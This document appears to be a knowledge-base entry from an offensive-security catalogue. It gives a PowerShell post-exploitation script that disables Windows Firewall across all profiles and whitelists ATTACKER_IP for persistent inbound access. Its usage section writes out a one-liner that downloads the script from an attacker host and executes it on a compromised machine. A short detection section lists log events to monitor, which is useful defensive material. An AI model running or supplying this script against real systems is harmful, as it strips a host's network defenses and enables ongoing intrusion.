---
id: 61dda204-fdd6-448e-b9d6-52d5a000671f
name: PowerShell-Script-to-Disable-Firewall-and-Whitelist-IP
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:27.701863+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - firewall-disable
  - whitelist
  - evasion
  - persistence
validated: true
---

# PowerShell-Script-to-Disable-Firewall-and-Whitelist-IP

## Code

```powershell
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

## Description

This PowerShell script first displays the current Windows Firewall profiles, then disables the firewall across all profiles for evasion, and finally creates an inbound whitelist rule for a specific IP to ensure persistent access. It combines reconnaissance, disable, and rule creation in one executable block, ideal for post-exploitation scripts.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `ATTACKER_IP` | IP address to whitelist for inbound traffic | `192.168.1.100` |

## Usage

Save as a .ps1 file and execute in an elevated PowerShell session on a compromised Windows host (e.g., Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')). Use after initial access to remove network barriers. The script is self-contained and requires no external tools beyond built-in Windows features.

## Detection

- Monitor PowerShell execution logs (Event ID 4104) for netsh or New-NetFirewallRule invocations.
- Audit Windows Firewall logs for state changes (Event ID 2004) or new rules (Event ID 4946).
- Network behavior anomalies: Sudden allowance of traffic from unknown IPs.
- Sysmon rules for process creation of powershell.exe with command-line arguments containing 'advfirewall' or 'New-NetFirewallRule'.

## Related

- [[procedures/Disable-Windows-Firewall-for-Persistence]]
